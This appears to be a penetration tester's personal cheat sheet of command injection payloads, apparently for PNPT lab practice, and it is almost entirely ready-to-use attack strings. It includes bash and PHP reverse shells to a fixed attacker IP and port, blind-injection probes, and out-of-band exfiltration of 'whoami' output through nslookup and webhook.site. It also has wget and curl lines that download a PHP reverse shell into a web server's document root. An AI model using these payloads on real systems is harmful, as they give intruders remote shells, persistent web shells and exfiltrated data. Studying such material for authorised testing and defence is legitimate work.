# Command Injection

Basic command chaining

```bash
; ls -la
```

Using logic operators

```bash
&& ls -la
```

Commenting out the rest of a command

```bash
; ls -la #
;whoami;#
;/bin/bash -i >& /dev/tcp/192/192.168.189.136/4444>&1#
;php -r '$sock=fsockopen("192.168.189.136",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#

#for PNPT command injection
-200-321)^2))}';php -r '$sock=fsockopen("192.168.189.136",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#
```

Using a pipe for command chaining

```bash
| ls -la
```

Testing for blind injection

```bash
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

Out-of-band testing

```bash
& nslookup webhook.site/<id>?`whoami` &
```

for blind command injection

```bash
#add ? on the end of webhook links
https://webhook.site/dc4d042f-4f0c-4819-a03a-8ea637627c80?`whoami`
https://stevesebastian.com \n wget http://192.168.189.136:9090/php-reverse-shell.php
https://stevesebastian.com && curl 192.168.189.136:9090/rev.php > /var/www/html/rev.php
```
